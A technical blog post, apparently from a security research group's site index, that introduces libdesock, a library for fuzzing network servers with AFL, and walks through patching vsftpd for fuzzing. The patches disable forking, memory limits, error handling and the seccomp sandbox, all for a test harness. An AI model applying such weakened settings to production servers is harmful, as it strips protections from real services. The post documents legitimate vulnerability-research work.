libdesock Fuzzing network servers with AFL is challenging since AFL provides its input via stdin or command line arguments while servers get their input over network connections. As the popularity of AFL grew, many attempts have been made of fuzzing popular servers like apache and nginx using different techniques and hacky workarounds. However an off-the-shelf network fuzzing solution for AFL didn\u0026rsquo;t exist for a long time until so-called \u0026ldquo;desocketing\u0026rdquo; tools emerged. These desocketing tools enabled network fuzzing without making a lot of additional modifications to the program under test and quickly became widely used in combination with AFL.\nWhat is \u0026ldquo;desocketing\u0026rdquo;? Before desocketing tools were published two common techniques for network fuzzing were\nSending fuzz input over real network connections Modifying the target source to use stdin instead of sockets The first approach is the most prevalent used by popular fuzzers like boofuzz or in academia by AFLnet or StateAFL . This however suffers performance- and stability-drawbacks. Stability is affected because the servers run with all threads and child processes enabled. Background threads can be scheduled independently from the input being sent resulting in invalid coverage information. Performance is affected because of the amount of kernel activity and network overhead involved.\nThe second approach solves the network overhead problem but does not reduce the kernel activity. It also takes a considerable amount of effort that may lead to changing thousands of lines of code .\nDesocketing aims to reduce kernel activity and the amount of modifications necessary to a program. It works by building a shared library that implements functions like socket() and accept() and preloading it via LD_PRELOAD into the address space of a network application where it replaces the network stack of the libc. The desocketing library simulates incoming connections to the server but every read on a socket is replaced by a read on stdin and every write on a socket is redirected to stdout. Strictly speaking the latter isn\u0026rsquo;t necessary for fuzzing but it\u0026rsquo;s useful for debugging.\nThe following figure demonstrates how to desock nginx such that the network traffic becomes visible on a terminal.\nHow desocketing works Making desocketing libraries has its complexities. AFLplusplus\u0026rsquo; socketfuzz ships a desocketing library that just returns 0 (stdin) in accept(). Unfortunately this doesn\u0026rsquo;t quite work because send() and recv() need an fd that actually refers to a network connection. If you pass them an fd that refers to a file the kernel will complain. Thus we need more complicated methods.\nAt the time of writing this, there exists only one popular desocketing solution: preeny . preeny creates a socketpair (a,b) and spawns two threads t1 andt2 in every call to socket().\nThread t1 forwards all data from stdin to a Thread t2 forwards all data from a to stdout In socket() preeny returns b When AFL writes input to stdin, thread t1 forwards that data to a Writing to a means that the data will become available in b and the application can read the request from b The application writes a response back to b, making the data available in socket a where t2 forwards it to stdout. Unfortunately this design makes preeny unsuitable for fuzzing:\nSpawning threads and joining them introduces additional overhead. Each thread realizes busy waiting by calling poll() every 15ms Preeny still relies on a lot of kernel interaction. I/O multiplexing (select, poll, epoll) is left completely to the kernel. The threads may introduce additional instability.\nNormally you want to disable threads when fuzzing with AFL. It can handle only single-threaded applications but most of the servers are multi-threaded A better desocketing library is needed that is more resource-efficient and handles the complexities of modern network applications correctly. So we created a new desocketing library: \u0026ldquo;libdesock\u0026rdquo;.\nUsing libdesock libdesock fully emulates the network stack of the kernel. The kernel is only queried to obtain file descriptors and to do I/O on stdin and stdout. Everything else - handling of connections, I/O multiplexing (select, poll, epoll), handling socket metadata (getsockname, getpeername) - entierly happens in userland.\nIn contrast to preeny, libdesock supports multi-threaded applications and its overall design makes it more resource efficient and 5x faster than preeny. This has no effect on AFL\u0026rsquo;s exec/s though, since that primarily depends on the program and the input.\nWe have tested libdesock on common network daemons like\nnginx Apache httpd OpenSSH Exim bind9 OpenVPN Redis dnsmasq cupsd curl (clients are supported too) and several smaller applications.\nlibdesock also supports event libraries like\nlibevent libuv libapr-2 Network applications generally are very complex and require modifications to be fuzzable with AFL.\nThey use multiple processes and threads, encryption, compression, checksums, hashes and sometimes custom allocators that don\u0026rsquo;t work with ASAN. They also run in an endless loop and have a lot of disk I/O (pidfiles, logfiles, temporary files). Setting these targets up for fuzzing means to reduce the complexity of the applications. The following example demonstrates the modifications necessary to fuzz vsftpd , a popular FTP server on Linux.\nFuzzing vsftpd Getting the source Download version 3.0.5 of vsftpd:\nwget https://security.appspot.com/downloads/vsftpd-3.0.5.tar.gz tar -xf vsftpd-3.0.5.tar.gz cd vsftpd-3.0.5 Patching the source vsftpd creates a new child process for each connection. We prohibit that by commenting out the code that does the fork in standalone.c:\n@@ -153,6 +153,7 @@ vsf_standalone_main(void) child_info.num_this_ip = 0; p_raw_addr = vsf_sysutil_sockaddr_get_raw_addr(p_accept_addr); child_info.num_this_ip = handle_ip_count(p_raw_addr); + /* if (tunable_isolate) { if (tunable_http_enable \u0026amp;\u0026amp; tunable_isolate_network) @@ -168,6 +169,8 @@ vsf_standalone_main(void) { new_child = vsf_sysutil_fork_failok(); } + */ + new_child = 0; if (new_child != 0) { /* Parent context */ vsftpd duplicates the FTP command socket to stdin, stdout and stderr. This obviously interfers with AFL so we disable that in defs.h \u0026hellip;\n@@ -3,7 +3,7 @@ #define VSFTP_DEFAULT_CONFIG \u0026#34;/etc/vsftpd.conf\u0026#34; -#define VSFTP_COMMAND_FD 0 +#define VSFTP_COMMAND_FD 29 #define VSFTP_PASSWORD_MAX 128 #define VSFTP_USERNAME_MAX 128 \u0026hellip; and in standalone.c\n@@ -205,9 +205,7 @@ static void prepare_child(int new_client_sock) { /* We must satisfy the contract: command socket on fd 0, 1, 2 */ - vsf_sysutil_dupfd2(new_client_sock, 0); - vsf_sysutil_dupfd2(new_client_sock, 1); - vsf_sysutil_dupfd2(new_client_sock, 2); + vsf_sysutil_dupfd2(new_client_sock, VSFTP_COMMAND_FD); if (new_client_sock \u0026gt; 2) { vsf_sysutil_close(new_client_sock); Next, vsftpd enforces a custom memory limit that interfers with ASAN. We disable the memory limit in sysutil.c\n@@ -2793,6 +2793,7 @@ void vsf_sysutil_set_address_space_limit(unsigned long bytes) { /* Unfortunately, OpenBSD is missing RLIMIT_AS. */ + return; #ifdef RLIMIT_AS int ret; struct rlimit rlim; Then we add a forkserver to vsftpd in prelogin.c\n@@ -59,6 +59,7 @@ init_connection(struct vsf_session* p_sess) { emit_greeting(p_sess); } + __AFL_INIT(); parse_username_password(p_sess); } vsftpd registers a SIGCHLD handler that interfers with the forkserver so we have to disable that too in standalone.c\n@@ -74,7 +74,7 @@ vsf_standalone_main(void) { vsf_sysutil_setproctitle(\u0026#34;LISTENER\u0026#34;); } - vsf_sysutil_install_sighandler(kVSFSysUtilSigCHLD, handle_sigchld, 0, 1); + //vsf_sysutil_install_sighandler(kVSFSysUtilSigCHLD, handle_sigchld, 0, 1); vsf_sysutil_install_sighandler(kVSFSysUtilSigHUP, handle_sighup, 0, 1); if (tunable_listen) { Last but not least we disable the bug() function in utility.c. This function does a failing fcntl() on an fd returned by the desocketing library since the fd is not a real socket. vsftpd handles the fcntl() failure by calling bug() again leading to an infinite loop.\n@@ -40,6 +40,7 @@ die2(const char* p_text1, const char* p_text2) void bug(const char* p_text) { + return; /* Rats. Try and write the reason to the network for diagnostics */ vsf_sysutil_activate_noblock(VSFTP_COMMAND_FD); (void) vsf_sysutil_write_loop(VSFTP_COMMAND_FD, \u0026#34;500 OOPS: \u0026#34;, 10); Build configuration In the Makefile replace:\n@@ -1,16 +1,16 @@ # Makefile for systems with GNU tools -CC =\tgcc +CC =\tafl-clang-fast INSTALL\t=\tinstall IFLAGS = -idirafter dummyinc #CFLAGS = -g -CFLAGS\t=\t-O2 -fPIE -fstack-protector --param=ssp-buffer-size=4 \\ -\t-Wall -W -Wshadow -Werror -Wformat-security \\ +CFLAGS\t=\t-fsanitize=address -g -Og -fPIE -fstack-protector \\ +\t-Wall -W -Wshadow -Wformat-security \\ -D_FORTIFY_SOURCE=2 \\ #-pedantic -Wconversion LIBS\t=\t`./vsf_findlibs.sh` -LINK\t=\t-Wl,-s -LDFLAGS\t=\t-fPIE -pie -Wl,-z,relro -Wl,-z,now +LINK\t=\t+LDFLAGS\t=\t-fPIE -pie -Wl,-z,relro -Wl,-z,now -fsanitize=address OBJS\t=\tmain.o utility.o prelogin.o ftpcmdio.o postlogin.o privsock.o \\ tunables.o ftpdataio.o secbuf.o ls.o \\ Runtime configuration Like most other servers, vsftpd needs a config file. Createfuzz.conf with the following contents:\nlisten=YES seccomp_sandbox=NO one_process_model=YES # User management anonymous_enable=YES no_anon_password=YES nopriv_user=nobody # Permissions connect_from_port_20=NO run_as_launching_user=YES listen_port=2121 listen_address=127.0.0.1 pasv_address=127.0.0.1 # Filesystem interactions write_enable=NO download_enable=NO Start fuzzing To use the desocketing library with AFL we need to set the AFL_PRELOAD variable.\nexport AFL_PRELOAD=libdesock.so afl-fuzz -i corpus -o findings -m none -- ./vsftpd fuzz.conf Now it\u0026rsquo;s only a matter of high-quality custom mutators and time to find some bugs.\nlibdesock can be downloaded here: https://github.com/fkie-cad/libdesock ","permalink":"https://lolcads.github.io/posts/2022/02/libdesock/","tags":["fuzzing","network","sockets","emulation"],"title":"libdesock"},{"categories":null,"content":"Written in Go, Hugo is an open source static site generator available under the Apache Licence 2.0. Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.\nHugo makes use of a variety of open source projects including:\nhttps://github.com/yuin/goldmark https://github.com/alecthomas/chroma https://github.com/muesli/smartcrop https://github.com/spf13/cobra https://github.com/spf13/viper Hugo is ideal for blogs, corporate websites, creative portfolios, online magazines, single page applications or even a website with thousands of pages.\nHugo is for people who want to hand code their own website without worrying about setting up complicated runtimes, dependencies and databases.\nWebsites built with Hugo are extremelly fast, secure and can be deployed anywhere including, AWS, GitHub Pages, Heroku, Netlify and any other hosting provider.\nLearn more and contribute on GitHub .\n","permalink":"https://lolcads.github.io/example/","tags":null,"title":"About"},{"categories":null,"content":"","permalink":"https://lolcads.github.io/manifest.json","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.de/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.es/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.fr/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.hi/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.jp/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.nl/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.pl/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.ru/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://lolcads.github.io/search/_index.zh-cn/","tags":null,"title":""},{"categories":null,"content":"This is a tech blog of loosly coupled individuals that like to sometimes play CTFs but mostly just have fun with deeply technical topics such as (malware) reverse engineering, fuzzing, vulnerability research, forensics, \u0026hellip; We hope you will find some valuable information on our site :) Get in touch if you want via Contact .\n","permalink":"https://lolcads.github.io/about/","tags":null,"title":"About"},{"categories":null,"content":"You can reach us at: Feel free to use our PGP key (fingerprint: CCD8 D75E 9A10 6BF4 3668 AB99 7E64 EF83 D585 CECA)\nYou can also report any issues (dead links, problems, \u0026hellip;) via GitHub: https://github.com/lolcads/lolcads.github.io/issues ","permalink":"https://lolcads.github.io/contact/","tags":null,"title":"Contact"}]